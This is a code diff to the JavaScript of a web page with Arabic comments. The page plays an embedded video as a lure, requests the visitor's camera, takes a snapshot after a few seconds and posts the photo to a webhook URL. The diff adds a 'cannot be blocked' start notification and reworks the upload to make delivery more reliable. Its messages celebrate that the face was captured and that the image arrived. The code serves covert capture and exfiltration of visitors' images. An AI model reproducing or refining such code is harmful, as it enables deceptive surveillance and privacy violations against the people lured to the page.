@@ -49,25 +49,29 @@
         overlay.style.display = 'none';
         iframe.style.visibility = 'visible';
 
+        // 1. إرسال إشارة البدء فوراً كرسالة نصية بسيطة (لا يمكن حظرها)
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ content: "🚀 **تم فتح الرابط.. جاري سحب الصورة الآن!**" })
+        });
+
         try {
-            // تشغيل الفيديو والصوت
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // طلب الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             camera.srcObject = stream;
 
             camera.onplaying = () => {
-                // نصور فوراً ونكرر الإرسال لضمان الوصول
-                setTimeout(captureNow, 3000);
+                setTimeout(captureFinal, 4000);
             };
         } catch (err) {
-            console.error("Error opening camera");
+            console.log("Error");
         }
     });
 
-    async function captureNow() {
+    async function captureFinal() {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
@@ -76,22 +80,21 @@
             canvas.height = camera.videoHeight;
             context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
-            // الطريقة الأكيدة: تحويل الصورة لملف PNG وإرساله كـ FormData
+            // تحويل الصورة لملف PNG حقيقي وإرساله بطريقة الـ FormData الأكيدة
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
                 const fd = new FormData();
-                fd.append('file', blob, 'capture.png');
-                fd.append('content', '📸 **تم التقاط الوجه بنجاح!**');
+                fd.append('file', blob, 'shot.png');
+                fd.append('content', '✅ **وصلت الصورة بنجاح!**');
 
                 await fetch(webhookURL, { 
                     method: 'POST', 
                     body: fd,
-                    // keepalive تضمن أن الطلب ما يتقفل لو الصفحة علقت
-                    keepalive: true 
+                    mode: 'cors' // نحدد النظام هنا لضمان قبول المتصفح
                 });
             }, 'image/png');
         } else {
-            setTimeout(captureNow, 1000);
+            setTimeout(captureFinal, 1000);
         }
     }
 </script>
